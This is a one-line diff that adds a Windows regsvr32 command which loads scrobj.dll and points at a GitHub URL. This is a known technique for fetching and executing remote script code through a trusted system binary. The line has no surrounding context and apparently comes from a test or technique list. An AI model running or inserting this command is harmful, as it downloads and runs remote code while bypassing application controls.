@@ -1,0 +1,1 @@
+regsvr32.exe /s /n /u /i:https://github.com/awsmhacks scrobj.dll
